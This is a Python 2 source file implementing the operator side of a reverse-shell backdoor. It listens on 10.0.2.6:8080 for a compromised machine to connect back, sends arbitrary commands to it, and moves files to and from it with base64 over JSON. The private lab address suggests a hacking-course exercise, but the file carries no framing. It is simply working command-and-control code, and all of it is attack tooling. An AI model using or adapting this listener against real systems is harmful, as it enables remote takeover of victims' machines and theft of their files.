import socket
import json
import base64


class SocketListener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening!")
        (self.connection, address) = listener.accept()
        print("Connection OK from " + str(address))

    def json_send_format(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_receive_format(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue

    def command_execution(self, command_to_send):
        self.json_send_format(command_to_send)
        if command_to_send[0] == "quit":
            self.connection.close()
            exit()
        return self.json_receive_format()

    def save_file(self, path, content):
        with open(path, "wb") as file_to_write:
            file_to_write.write(base64.b64decode(content))
            return "Download OK"

    def read_file_content(self, path):
        with open(path, "rb") as file_to_read:
            return base64.b64encode(file_to_read.read())

    def start_listener(self):
        while True:
            command_to_send = raw_input("Enter command: ")
            command_list_to_send = command_to_send.split(" ")
            try:
                if command_list_to_send[0] == "upload":
                    content = self.read_file_content(command_list_to_send[1])
                    command_list_to_send.append(content)

                command_received = self.command_execution(command_list_to_send)

                if command_list_to_send[0] == "download" and "Error!" not in command_received:
                    command_received = self.save_file(command_list_to_send[1], command_received)
            except Exception:
                command_received = "Error!"
            print(command_received)


socket_listener = SocketListener("10.0.2.6", 8080)
socket_listener.start_listener()
